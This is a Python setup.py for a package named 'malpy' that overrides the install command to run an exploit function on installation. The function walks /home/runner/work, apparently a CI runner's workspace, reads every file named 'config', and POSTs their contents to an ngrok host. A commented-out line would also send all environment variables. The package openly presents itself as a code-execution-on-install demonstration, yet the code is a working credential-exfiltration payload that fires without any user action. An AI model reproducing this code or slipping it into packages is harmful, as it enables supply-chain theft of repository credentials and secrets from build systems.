import os
import time
import json
import http.client
from setuptools import setup
from setuptools.command.install import install


def exploit(host):
    configs = {}

    for root, dirs, files in os.walk("/home/runner/work"):
        if "config" in files:
            path = os.path.join(root, "config")
            with open(path) as f:
                configs[path] = f.read()

    headers = {"content-type": "application/json"}
    # params = json.dumps({"configs": configs, "env": dict(os.environ)})
    params = json.dumps({"configs": configs})

    conn = http.client.HTTPConnection(host)
    conn.request("POST", "", params, headers)
    response = conn.getresponse()
    conn.close()

    # time.sleep(60 * 5)


class PostInstallCommand(install):
    def run(self):
        exploit("aded-2401-4900-1c8f-98d-64e2-efeb-1338-8fec.in.ngrok.io")
        # install.run(self)


setup(
    name="malpy",
    version="0.1.0",
    description="Code execution via Python package installation (credits: https://github.com/mschwager/0wned).",
    url="https://github.com/nikitastupin/pwnhub",
    cmdclass={
        "install": PostInstallCommand,
    },
)
